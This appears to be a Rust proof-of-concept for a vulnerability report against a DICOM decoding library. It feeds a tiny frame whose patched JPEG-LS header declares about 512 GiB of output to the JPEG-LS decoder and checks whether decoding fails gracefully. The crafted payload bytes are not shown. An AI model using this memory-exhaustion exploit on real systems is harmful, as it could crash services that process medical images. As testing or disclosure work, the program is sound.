struct FakePixelData;

impl PixelDataObject for FakePixelData {
    fn transfer_syntax_uid(&self) -> &str {
        "1.2.840.10008.1.2.4.80"
    }
    fn rows(&self) -> Option<u16> {
        Some(4)
    }
    fn cols(&self) -> Option<u16> {
        Some(4)
    }
    fn samples_per_pixel(&self) -> Option<u16> {
        Some(1)
    }
    fn bits_allocated(&self) -> Option<u16> {
        Some(16)
    }
    fn bits_stored(&self) -> Option<u16> {
        Some(16)
    }
    fn photometric_interpretation(&self) -> Option<&str> {
        Some("MONOCHROME2")
    }
    fn number_of_frames(&self) -> Option<u32> {
        Some(1)
    }
    fn number_of_fragments(&self) -> Option<u32> {
        Some(1)
    }
    fn fragment(&self, fragment: usize) -> Option<Cow<'_, [u8]>> {
        if fragment == 0 {
            Some(Cow::Borrowed(FRAGMENT))
        } else {
            None
        }
    }
    fn offset_table(&self) -> Option<Cow<'_, [u32]>> {
        None
    }
    fn raw_pixel_data(&self) -> Option<RawPixelData> {
        None
    }
}

fn main() {
    let ts = TransferSyntaxRegistry
        .get("1.2.840.10008.1.2.4.80")
        .expect("JPEG-LS Lossless should be registered");
    let reader = ts
        .pixel_data_reader()
        .expect("JPEG-LS Lossless should have a pixel data reader (the `charls` feature is enabled)");

    println!(
        "declared DICOM attributes: Rows=4 Columns=4 SamplesPerPixel=1 BitsAllocated=16 (a tiny, ordinary frame)"
    );
    println!(
        "actual encapsulated JPEG-LS fragment: {} bytes, a genuine charls-encoded codestream whose \
         own embedded SOF55 header was patched from Height=Width=4 to Height=Width=0xFFFF and \
         ComponentCount=64 -> destination size = 65535*65535*64*2 = 549,739,036,800 bytes (~512 GiB), \
         entirely independent of the DICOM object's own Rows/Columns/SamplesPerPixel above",
        FRAGMENT.len()
    );

    let src = FakePixelData;
    let mut dst = Vec::new();

    // If the process is still alive to print past this point, decoding did not abort on the
    // embedded-header-declared size alone.
    let result = reader.decode_frame(&src, 0, &mut dst);
    match result {
        Ok(()) => println!("did not reproduce - decode unexpectedly succeeded, {} bytes", dst.len()),
        Err(e) => println!(
            "did not reproduce - decode failed gracefully with a normal Result::Err: {:?}",
            e
        ),
    }
}
